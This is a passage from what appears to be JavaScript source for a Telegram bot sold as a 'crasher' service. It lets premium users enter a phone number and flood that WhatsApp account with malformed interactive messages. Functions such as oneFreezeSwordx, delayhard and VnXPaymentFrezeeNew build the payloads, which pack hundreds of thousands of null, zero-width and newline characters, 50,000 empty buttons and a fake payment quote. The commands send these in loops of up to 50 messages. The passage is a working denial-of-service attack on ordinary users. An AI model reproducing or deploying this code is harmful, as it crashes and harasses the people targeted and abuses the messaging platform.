          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 20; i++) {
      await oneFreezeSwordx(sock, target);
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// CASE BUG ///
bot.command("xloca", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xloca 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xloca 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Bulldozzer combo
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 86%
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalins Crashers Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xloca 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Bulldozzer combo
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 85%
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Invlasion`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 50; i++) {
      await delayhard(sock, target);
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// Hapus bug ///
bot.command("hapusbug", checkWhatsAppConnection, async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  const args = ctx.message.text.trim().split(/\s+/).slice(1);
  const q = args[0];

  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return ctx.reply(
      "❌ You are not authorized to view the premium list."
    );
  }

 
  if (sessions.size === 0) {
    return ctx.reply(
      "❌ ⵢ Sender Not Connected\nPlease /connect"
    );
  }

  
  if (!sock) {
    return ctx.reply(
      "❌ WhatsApp socket tidak aktif"
    );
  }

  
  if (!q) {
    return ctx.reply(
      "Cara Pakai Nih Njing!!!\n/hapusbug 62xxx"
    );
  }

  let pepec = q.replace(/[^0-9]/g, "");

  if (pepec.startsWith("0")) {
    return ctx.reply(
      "Contoh : /hapusbug 62xxx"
    );
  }

  let target = pepec + "@s.whatsapp.net";

  try {

  
    const processMessage = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: `
<blockquote><strong>｢ ⸸ ｣ Zalindra Clear Bug Process</strong></blockquote>
⌑ Target
ᯓ➤ ${target}
⌑ Type
ᯓ➤ Clear Personal Bug
⌑ Status
ᯓ➤ Process
<blockquote><i>By @seanoffc</i></blockquote>
`,
        parse_mode: "HTML"
      }
    );

  
    for (let i = 0; i < 3; i++) {
      await sock.sendMessage(target, {
        text: "𝐂𝐈𝐊𝐈𝐃𝐀𝐖 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐒𝐄𝐍𝐙𝐘 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
      });
    }

    
    await ctx.telegram.editMessageCaption(
      chatId,
      processMessage.message_id,
      undefined,
      `
<blockquote><strong>｢ ⸸ ｣ Zalin Clear Bug Process</strong></blockquote>
⌑ Target
ᯓ➤ ${target}
⌑ Type
ᯓ➤ Clear Personal Bug
⌑ Status
ᯓ➤ Success
<blockquote><i>By @seanoffc</i></blockquote>
`,
      {
        parse_mode: "HTML"
      }
    );

    await ctx.reply("Done Clear Bug By sen😜");

  } catch (err) {
    console.error("HAPUSBUG ERROR:", err);

    await ctx.reply(
      `Ada kesalahan saat mengirim bug.\n${err.message}`
    );
  }
});
// ------------ (  FUNCTION BUGS ) -------------- \\
async function oneFreezeSwordx(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "Zalindra Ampozzz?!¡" + "𑇂𑆵𑆴𑆿",
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "order_status",
            buttonParamsJson: `{"order_id":"${"\u0000".repeat(90000)}","status":"${"\u200B".repeat(90000)}","invalid_data":"${"\n".repeat(90000)}","\u200C":"${"\x10".repeat(90000)}","null":"${"\0".repeat(90000)}"}`
          },
          ...Array.from({ length: 50000 }, () => ({}))
        ],
        messageParamsJson: "{[".repeat(10000)
      }
    }
  }, { participant: { jid: target } });
}

async function delayhard(sock, target) {
  const whiletrue = {
    interactiveMessage: {
      body: {
        text: "ZALINDRA ADEK"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "\u0000".repeat(250000)
          },
          {
            name: "\n".repeat(250000)
          },
          {
            name: "\0".repeat(25000)
          },
          {
            name: "\x10".repeat(250000)
          }
        ]
      }
    }
  };

  const participant = {
    jid: target
  };

  await sock.relayMessage(
    target,
    whiletrue,
    {
      participant
    }
  );
}

async function VnXPaymentFrezeeNew(sock, target) {
  try {
    const qpayment = {
      key: {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
        id: 'ownername',
        participant: '0@s.whatsapp.net'
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: '0@s.whatsapp.net',
          noteMessage: {
            extendedTextMessage: {
              text: 'aku mau fokus belajar duluu'
            }
          },
          expiryTimestamp: 999999999,
          amount: {
            value: 91929291929,
            offset: 1000,
            currencyCode: "IDR"
          }
        }
      } 
    };

    const vnxfrezee = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "ZALINDRA BOS" },
            footer: { text: "By @seanoffc" },
            nativeFlowMessage: {
              buttons: Array.from({ length: 50000 }, () => ({}))
            },
            contextInfo: {
              stanzaId: qpayment.key.id,
              participant: qpayment.key.participant,
              quotedMessage: qpayment.message
            }
          } 
        } 
      } 
    };

    await sock.relayMessage(target, vnxfrezee, { 
      participant: { jid: target } 
    });

    console.log('✅ sen Payment Frezee Hard Success');
  } catch (err) {
    console.error('❌ Error Combo System:', err);
  }
}

// --- Jalankan Bot --- //
(async () => {
  try {
    console.clear();

    currentMode = getMode();

    
    await startSesi();

    
    await bot.launch();

    process.once("SIGINT", () => bot.stop("SIGINT"));
    process.once("SIGTERM", () => bot.stop("SIGTERM"));

    console.log("✅ Bot Telegram launched");
    console.log("🟢 System ready");

  } catch (err) {
    console.error("❌ Failed to start:", err);

    setTimeout(() => {
      
      process.exit(1);
    }, 3000);
  }
})();